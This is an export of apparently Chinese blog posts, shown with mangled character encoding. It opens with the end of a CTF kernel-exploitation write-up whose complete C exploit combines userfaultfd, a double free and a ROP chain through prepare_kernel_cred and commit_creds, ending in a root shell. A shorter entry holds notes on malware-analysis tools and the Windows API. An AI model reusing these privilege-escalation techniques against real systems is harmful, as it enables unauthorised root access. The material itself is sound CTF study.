  <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            errExit(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] push trapped in userfaultfd.&quot;</span>);<br>        pop(&amp;kernel_offset);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak ptr: %p\n&quot;</span>, kernel_offset);<br>        kernel_offset -= <span class="hljs-number">0xffffffff81c37bc0</span>;<br>        kernel_base += kernel_offset;<br><br>        uffdio_copy.src = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">double_free_thread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-keyword">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">long</span> uffd;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-keyword">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-keyword">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-keyword">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            errExit(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pop trapped in userfaultfd.&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] construct the double free...&quot;</span>);<br>        pop(page);<br><br>        uffdio_copy.src = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">size_t</span>  pop_rdi_ret = <span class="hljs-number">0xffffffff81034505</span>;<br><span class="hljs-keyword">size_t</span>  xchg_rax_rdi_ret = <span class="hljs-number">0xffffffff81d8df6d</span>;<br><span class="hljs-keyword">size_t</span>  mov_rdi_rax_pop_rbp_ret = <span class="hljs-number">0xffffffff8121f89a</span>;<br><span class="hljs-keyword">size_t</span>  swapgs_restore_regs_and_return_to_usermode = <span class="hljs-number">0xffffffff81600a34</span>;<br><span class="hljs-keyword">long</span>    flag_fd;<br><span class="hljs-keyword">char</span>    flag_buf[<span class="hljs-number">0x100</span>];<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">hijack_thread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-keyword">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">long</span> uffd;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-keyword">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-keyword">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-keyword">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            errExit(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] setxattr trapped in userfaultfd.&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger now...&quot;</span>);<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)<br>            close(seq_fd_reserve[i]);<br><br>        <span class="hljs-comment">// trigger</span><br>        pop_rdi_ret += kernel_offset;<br>        xchg_rax_rdi_ret += kernel_offset;<br>        mov_rdi_rax_pop_rbp_ret += kernel_offset;<br>        prepare_kernel_cred = <span class="hljs-number">0xffffffff81069e00</span> + kernel_offset;<br>        commit_creds = <span class="hljs-number">0xffffffff81069c10</span> + kernel_offset;<br>        swapgs_restore_regs_and_return_to_usermode += kernel_offset + <span class="hljs-number">0x10</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] gadget: %p\n&quot;</span>, swapgs_restore_regs_and_return_to_usermode);<br>        __asm__(<br>            <span class="hljs-string">&quot;mov r15,   0xbeefdead;&quot;</span><br>            <span class="hljs-string">&quot;mov r14,   0x11111111;&quot;</span><br>            <span class="hljs-string">&quot;mov r13,   pop_rdi_ret;&quot;</span><br>            <span class="hljs-string">&quot;mov r12,   0;&quot;</span><br>            <span class="hljs-string">&quot;mov rbp,   prepare_kernel_cred;&quot;</span><br>            <span class="hljs-string">&quot;mov rbx,   mov_rdi_rax_pop_rbp_ret;&quot;</span>    <br>            <span class="hljs-string">&quot;mov r11,   0x66666666;&quot;</span><br>            <span class="hljs-string">&quot;mov r10,   commit_creds;&quot;</span><br>            <span class="hljs-string">&quot;mov r9,    swapgs_restore_regs_and_return_to_usermode;&quot;</span><br>            <span class="hljs-string">&quot;mov r8,    0x99999999;&quot;</span><br>            <span class="hljs-string">&quot;xor rax,   rax;&quot;</span><br>            <span class="hljs-string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span><br>            <span class="hljs-string">&quot;mov rdx,   8;&quot;</span><br>            <span class="hljs-string">&quot;mov rsi,   rsp;&quot;</span><br>            <span class="hljs-string">&quot;mov rdi,   seq_fd;&quot;</span><br>            <span class="hljs-string">&quot;syscall&quot;</span><br>        );<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] back to userland successfully!&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] uid: %d gid: %d\n&quot;</span>, getuid(), getgid());<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] execve root shell now...&quot;</span>);<br>        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><br>        uffdio_copy.src = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *data)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (ioctl(dev_fd, <span class="hljs-number">0x57AC0001</span>, data) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;push!&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">pop</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *data)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (ioctl(dev_fd, <span class="hljs-number">0x57AC0002</span>, data) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;pop!&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">size_t</span>      data[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-keyword">char</span>        *uffd_buf_leak;<br>    <span class="hljs-keyword">char</span>        *uffd_buf_uaf;<br>    <span class="hljs-keyword">char</span>        *uffd_buf_hack;<br>    <span class="hljs-keyword">int</span>         pipe_fd[<span class="hljs-number">2</span>];<br>    <span class="hljs-keyword">int</span>         shm_id;<br>    <span class="hljs-keyword">char</span>        *shm_addr;<br><br>    dev_fd = open(<span class="hljs-string">&quot;/proc/stack&quot;</span>, O_RDONLY);<br><br>    page = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    page_size = sysconf(_SC_PAGE_SIZE);<br><br>    <span class="hljs-comment">// reserve object to protect freelist</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)<br>        <span class="hljs-keyword">if</span> ((seq_fd_reserve[i] = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;seq reserve!&quot;</span>);<br><br>    <span class="hljs-comment">// create uffd thread for leak</span><br>    uffd_buf_leak = (<span class="hljs-keyword">char</span>*) mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    registerUserFaultFd(uffd_buf_leak, page_size, leak_thread);<br><br>    <span class="hljs-comment">// left dirty data in kmalloc-32</span><br>    shm_id = shmget(<span class="hljs-number">114514</span>, <span class="hljs-number">0x1000</span>, SHM_R | SHM_W | IPC_CREAT);<br>    <span class="hljs-keyword">if</span> (shm_id &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;shmget!&quot;</span>);<br>    shm_addr = shmat(shm_id, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (shm_addr &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;shmat!&quot;</span>);<br>    <span class="hljs-keyword">if</span>(shmdt(shm_addr) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;shmdt!&quot;</span>);<br><br>    <span class="hljs-comment">// leak kernel base    </span><br>    push(uffd_buf_leak);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] kernel offset: %p\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] kernel base: %p\n&quot;</span>, kernel_base);<br><br>    <span class="hljs-comment">// create uffd thread for double free</span><br>    uffd_buf_uaf = (<span class="hljs-keyword">char</span>*) mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    registerUserFaultFd(uffd_buf_uaf, page_size, double_free_thread);<br><br>    <span class="hljs-comment">// construct the double free</span><br>    push(<span class="hljs-string">&quot;arttnba3&quot;</span>);<br>    pop(uffd_buf_uaf);<br><br>    <span class="hljs-comment">// create uffd thread for hijack</span><br>    uffd_buf_hack = (<span class="hljs-keyword">char</span>*) mmap(<span class="hljs-literal">NULL</span>, page_size * <span class="hljs-number">2</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    registerUserFaultFd(uffd_buf_hack + page_size, page_size, hijack_thread);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] gadget: %p\n&quot;</span>, <span class="hljs-number">0xffffffff814d51c0</span> + kernel_offset);<br>    *(<span class="hljs-keyword">size_t</span> *)(uffd_buf_hack + page_size - <span class="hljs-number">8</span>) = <span class="hljs-number">0xffffffff814d51c0</span> + kernel_offset;    <span class="hljs-comment">// add rsp , 0x1c8 ; pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop r15; pop rbp ; ret</span><br><br>    <span class="hljs-comment">// userfaultfd + setxattr to hijack the seq_ops-&gt;stat, trigger in uffd thread</span><br>    seq_fd = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);<br>    setxattr(<span class="hljs-string">&quot;/exp&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, uffd_buf_hack + page_size - <span class="hljs-number">8</span>, <span class="hljs-number">32</span>, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>è¿è¡Œå³å¯ get root shell</p><p><a href=""><img src="https://s2.loli.net/2023/02/06/NkURY6wPnh7yi8M.png" alt="image.png"></a></p><h1 id="ä¸€äº›ç»“æ„ä½“-amp-tricks"><a href="#ä¸€äº›ç»“æ„ä½“-amp-tricks" class="headerlink" title="ä¸€äº›ç»“æ„ä½“&amp;tricks"></a>ä¸€äº›ç»“æ„ä½“&amp;tricks</h1><h2 id="io-uring"><a href="#io-uring" class="headerlink" title="io_uring"></a>io_uring</h2><blockquote><p>æœ€æ—©æ˜¯åœ¨RCTF2022 gameä¸­çœ‹åˆ°, ç„¶é¹…è¢«umountçš„éé¢„æœŸè–„çº±äº†. é¢„æœŸæ˜¯ldt_structå’Œio_uringç›¸é…åˆçš„ä»»æ„è¯»å†™+credä¿®æ”¹. </p><p><a href="https://web.archive.org/web/20221119160242/https://www.graplsecurity.com/post/iou-ring-exploiting-the-linux-kernel">uring+FUSE</a>, éå¸¸è¯¦ç»†, å¤šåˆ°ä¸æƒ³çœ‹. ä½†æ˜¯è¿™ç½‘ç«™å±…ç„¶æŒ‚äº†, ç”¨çš„webarchive. æœ‰å…³FUSEåœ¨ä¸Šé¢çš„æ¡ä»¶ç«äº‰ä¸­ä¹Ÿæœ‰. </p></blockquote><p>é¢˜ç›®ä¸­ç”¨åˆ°çš„æ˜¯update_tag, ä¸Šé¢æ–‡ç« ä¸­ç”¨çš„æ˜¯bufferç›¸å…³. </p><h2 id="ldt-struct"><a href="#ldt-struct" class="headerlink" title="ldt_struct"></a>ldt_struct</h2><blockquote><p> RCTF gameä¸­å·²è§è¿‡. å¦ä¸€é“ç›¸å…³å¤šè§£<a href="https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/#0x02-kernote">é¢˜ç›®</a>. </p></blockquote>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Malware Analysis</title>
    <link href="/2022-12/Now-Malware-Analysis/"/>
    <url>/2022-12/Now-Malware-Analysis/</url>
    
    <content type="html"><![CDATA[<h1 id="é™æ€åˆ†æ"><a href="#é™æ€åˆ†æ" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h1><ul><li><a href="https://blog.csdn.net/qq_43633973/article/details/102378477">PEç»“æ„åˆ†æ</a> </li></ul><h2 id="ä½¿ç”¨è½¯ä»¶å·¥å…·"><a href="#ä½¿ç”¨è½¯ä»¶å·¥å…·" class="headerlink" title="ä½¿ç”¨è½¯ä»¶å·¥å…·"></a>ä½¿ç”¨è½¯ä»¶å·¥å…·</h2><ul><li>å®‰è£…çš„<ul><li>Resource Hacker</li><li>IDA Free</li><li>PEBrowse64 Professional</li><li></li></ul></li><li>å…å®‰è£…<ul><li>PEView</li><li>Dependency walk</li><li>Process Monitor | Process Explorer<ul><li>monitorä¸­çš„lower paneå¯ä»¥æŸ¥çœ‹handle+dll, </li></ul></li><li>RegShot</li><li></li></ul></li></ul><p>è¿‡ç¨‹ä¸­è¦æ³¨æ„çš„ä¿¡æ¯:</p><ul><li><p>å‘½åçº¦å®š</p><blockquote><p>å½“ å¾®è½¯æ›´æ–°ä¸€ä¸ªå‡½æ•°ï¼Œè€Œä¸”æ–°å‡½æ•°ä¸åŸå…ˆå‡½æ•°ä¸å…¼å®¹çš„æ—¶å€™ï¼Œå¾®è½¯è¿˜ä¼šç»§ç»­æ”¯å¾…åŸå…ˆçš„æ—§å‡½æ•° ã€‚ è¿™æ—¶æ–°å‡½æ•°ä¼šç»™ä¸€ä¸ªä¸æ—§å‡½æ•°ç›¸åŒçš„åå­—ï¼Œå¹¶åœ¨åé¢åŠ ä¸Š Ex åç¼€ ã€‚ è€Œè¢«æ˜¾è‘—æ›´æ–°è¿‡ä¸¤æ¬¡çš„å‡½æ•°ï¼Œåˆ™ä¼šåœ¨å®ƒä»¬çš„åå­—åé¢æœ‰ä¸¤ä¸ª Ex åç¼€ ã€‚</p><p>ä»¥ å­— ç¬¦ä¸²ä½œä¸º å‚ æ•°çš„è®¸å¤šå‡½æ•°ï¼Œåœ¨å®ƒä»¬çš„åå­—åé¢ä¼šåŒ…å« ä¸€ ä¸ª A æˆ–è€… ä¸€ ä¸ª w , å¦‚CreateDirectoryWã€‚ </p></blockquote></li><li><p>å¸¸è§å¯¼å…¥dll</p></li></ul><p><img src="../../image/Malware_Analysis/image-20221214164012612.png" alt="image-20221214164012612"></p><p><a href="https://www.52pojie.cn/thread-1494490-1-1.html">Win7ç²¾ç®€å¸¦å·¥å…·</a> </p><p><a href="https://www.52pojie.cn/thread-661779-1-1.html">Winxp 32ç²¾ç®€å¸¦å·¥å…·</a> </p><h3 id="è£…è™šæ‹Ÿæœºé‡åˆ°çš„é—®é¢˜"><a href="#è£…è™šæ‹Ÿæœºé‡åˆ°çš„é—®é¢˜" class="headerlink" title="è£…è™šæ‹Ÿæœºé‡åˆ°çš„é—®é¢˜:"></a>è£…è™šæ‹Ÿæœºé‡åˆ°çš„é—®é¢˜:</h3><ul><li>win7ç›´æ¥è¿è¡Œä¸äº†è‡ªè§£å‹ç¨‹åº. é‚å¼ƒç”¨, æ”¹ä¸ºwinxp. </li><li>32ä½çš„winxpæ‰‹æ„ŸçœŸå¥‡ç‰¹. ä¸è¿‡å·¥å…·åŒ…ä¸­çš„ä¸€äº›64ä½ç¨‹åºæ— æ³•è¿è¡Œ. </li><li>xpé‡Œé¢system32ç›®å½•ä¸‹æ²¡æœ‰strings, ä»<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/strings">windowså®˜ç½‘</a>ä¸‹äº†ä¸€ä¸ª, åŸæ¥è¿™æ˜¯åœ¨ä¸€ä¸ªå·¥å…·åŒ…é‡Œé¢çš„, è¿˜æœ‰ä¸€äº›æœ‰è¶£çš„å°å·¥å…·. å¥½å§åªæœ‰Windows Vista and higherèƒ½ç”¨. ä¸ç®¡äº†. </li><li>åŠ äº†å‡ ä¸ªå¿«ç…§ä»¥é˜²ä¸‡ä¸€</li></ul><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><ul><li>Use Standard Symbolic Constant<ul><li>åœ¨Type Librariesé‡ŒæŸ¥çœ‹å¸¸é‡æ‰€åœ¨åº“æ˜¯å¦è¢«åŠ è½½. é€šå¸¸ mssdkå’Œ vc6winä¼šè‡ªåŠ¨è¢«åŠ è½½, è¦è·å–æœ¬åœ°APIçš„ç¬¦å·å¸¸é‡ , åŠ è½½ntapi<br>ï¼ˆå¾®è½¯Windows NT 4 . 0æœ¬åœ°API), åˆ†æä¸€ä¸ª LinuxäºŒè¿›åˆ¶æ—¶ï¼Œä½ å¯èƒ½éœ€è¦æ‰‹åŠ¨åŠ è½½ gnuunx (GNU C++ UNIX ) åº“ .</li></ul></li><li>è„šæœ¬<ul><li>IDC, IDAPython</li><li>IDCå³æˆ‘åœ¨pwncollegeé‡Œé¢ç”¨åˆ°çš„æ–­ç‚¹ä»£ç .</li><li>IDAPythonæä¾›äº†ä¸€å¤§å †IDA Proçš„SDKåŠŸèƒ½,æä¾›äº†è¿œæ¯”IDCå¼ºå¤§è®¸å¤šçš„è„šæœ¬åŒ–èƒ½åŠ›ã€‚IDAPythonæä¾›3ä¸ªæ¨¡å—æ¥è®¿é—®IDAAPl (idaapi)ã€IDCæ¥å£ï¼ˆidcï¼‰ä»¥åŠIDAPythonå·¥å…·å‡½æ•°ï¼ˆidautils)ã€‚</li><li></li></ul></li></ul><h2 id="Winä¸‹çš„ç¨‹åºåˆ†æ"><a href="#Winä¸‹çš„ç¨‹åºåˆ†æ" class="headerlink" title="Winä¸‹çš„ç¨‹åºåˆ†æ"></a>Winä¸‹çš„ç¨‹åºåˆ†æ</h2><h3 id="Windows-API"><a href="#Windows-API" class="headerlink" title="Windows API"></a>Windows API</h3><p>ç±»å‹</p><ul><li><p>Windows æ€»ä½“ä¸Šä½¿ç”¨åŒˆç‰™åˆ©è¡¨è¾¾æ³• ï¼Œ ä½œä¸º API å‡½æ•°æ ‡è¯†ç¬¦ã€‚è¿™ä¸ªè¡¨è¾¾å¼ä½¿ç”¨ ä¸€ ä¸ªå‰ç¼€å‘½åæ¨¡å¼ï¼Œæ¥ä½¿è¯†åˆ« ä¸€ä¸ªå˜é‡çš„ç±»å‹æ›´ä¸ºå®¹æ˜“ã€‚ åŒ…å«ä¸€ä¸ª 32 ä½æ— ç¬¦å·æ•´æ•°çš„å˜æ’® ï¼Œ æˆ–DWORD , ä¼šä»¥ dw å¼€å¤´. è¿˜æœ‰åƒæ˜¯:</p><p><img src="../../image/Malware_Analysis/image-20221214164634786.png" alt="image-20221214164634786"></p></li></ul><p>å¥æŸ„</p><ul><li>å¥æŸ„æ˜¯åœ¨æ“ä½œç³»ç»Ÿä¸­è¢«æ‰“å¼€æˆ–è¢«åˆ›å»ºçš„é¡¹ï¼Œæ¯”å¦‚ä¸€ä¸ªçª—å£ ã€è¿›ç¨‹ã€æ¨¡å— ã€ èœå•ã€æ–‡ä»¶ï¼Œç­‰ç­‰ ã€‚å¥æŸ„åœ¨å®ƒä»¬å¼•ç”¨ ä¸€ä¸ªå¯¹è±¡æˆ–å…¶ä»–æŸä¸ªå†…å­˜ä½ç½®è¿™ç‚¹ä¸Šå¾ˆåƒæŒ‡é’ˆã€‚ç„¶è€Œï¼Œå’ŒæŒ‡é’ˆä¸åŒçš„æ˜¯ï¼Œå¥æŸ„ä¸èƒ½è¢«ç”¨æ¥è¿›è¡Œæ•°å­¦æ“ä½œï¼Œå¹¶ä¸”å®ƒä»¬ä¸æ€»æ˜¯è¡¨ç¤ºå¯¹è±¡åœ°å€ ã€‚ ä½ èƒ½å¯¹å¥æŸ„åšçš„å”¯ä¸€ çš„äº‹æƒ…ï¼Œå°±æ˜¯ä¿å­˜å®ƒï¼Œå¹¶åœ¨åç»­å‡½æ•°è°ƒç”¨ä¸­ä½¿ç”¨å®ƒæ¥å¼•ç”¨åŒ ä¸€ä¸ªå¯¹è±¡ ã€‚</li></ul><p>æ–‡ä»¶ç³»ç»Ÿå‡½æ•°</p><ul><li>CreateFileMappingA | <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile">MapViewOfFile</a> : è¿™ä¸¤ä¸ªå°±åƒæ˜¯mmapä¸€æ ·, ä¸è¿‡æ‹†åˆ†æˆäº†ä¸¤ä¸ªå‡½æ•°æ¥å®Œæˆæ“ä½œ, ç¬¬ä¸€ä¸ªå‡½æ•°åˆ›å»ºä¸€ä¸ªfile mapping object, ç¬¬äºŒä¸ªå‡½æ•°ä½¿ç”¨å…¶è¿”å›çš„handleræ¥åˆ›å»ºmapping.  </li><li>CreateFile : å®ƒå¯ä»¥æ‰“å¼€å·²ç»å­˜åœ¨çš„æ–‡ä»¶ï¼Œç®¡é“ï¼Œæµï¼Œä»¥åŠI/O è®¾å¤‡ï¼Œè¿˜èƒ½åˆ›å»ºæ–°çš„æ–‡ä»¶ã€‚å‚æ•°<code>dwCreationDisposition</code>æ§åˆ¶CreateFile å‡½æ•°æ˜¯å¦åˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼Œæˆ–æ˜¯æ‰“å¼€ä¸€ä¸ªå·²ç»å­˜åœ¨çš„æ–‡ä»¶ ã€‚</li><li>ReadFile å’Œ WriteFile: ä¸èƒ½æ”¹å˜æ–‡ä»¶æŒ‡é’ˆ. </li></ul><p>ç‰¹æ®Šæ–‡ä»¶</p><ul><li>P158: å…±äº«æ–‡ä»¶ é€šè¿‡åå­—ç©ºé—´è®¿é—®çš„æ–‡ä»¶ å¤‡ç”¨ æ•°æ®æµ</li></ul><h3 id="Windows-æ³¨å†Œè¡¨"><a href="#Windows-æ³¨å†Œè¡¨" class="headerlink" title="Windows æ³¨å†Œè¡¨"></a>Windows æ³¨å†Œè¡¨</h3><ul><li>æ³¨å†Œè¡¨æ ¹é”®</li><li>Regedit</li><li>è‡ªå¯åŠ¨ç¨‹åº: Autoruns</li><li>å¸¸ç”¨æ³¨å†Œè¡¨å‡½æ•°: RegOpenKeyEx RegSetValueEx RegGetValue</li><li>.reg æ–‡ä»¶çš„æ³¨å†Œè¡¨è„šæœ¬</li></ul><ul><li><p><a href="https://learn.microsoft.com/en-us/windows/win32/sync/mutex-objects">Mutex</a> </p></li><li><p>å¯ä½¿ç”¨â€”ä¸ªäº’æ–¥é‡æ¥ç¡®ä¿æ¶æ„ä»£ç åªæœ‰ä¸€ä»½å®ä¾‹åœ¨ç³»ç»Ÿä¸Šè¿è¡Œ. çœ‹æ¥æ˜¯ç³»ç»Ÿçº§åˆ«çš„ä¸€ä¸ªå˜é‡, å¦‚æœè¦è·¨è¿›ç¨‹åªè¦openMutexè·å–handleå³å¯. 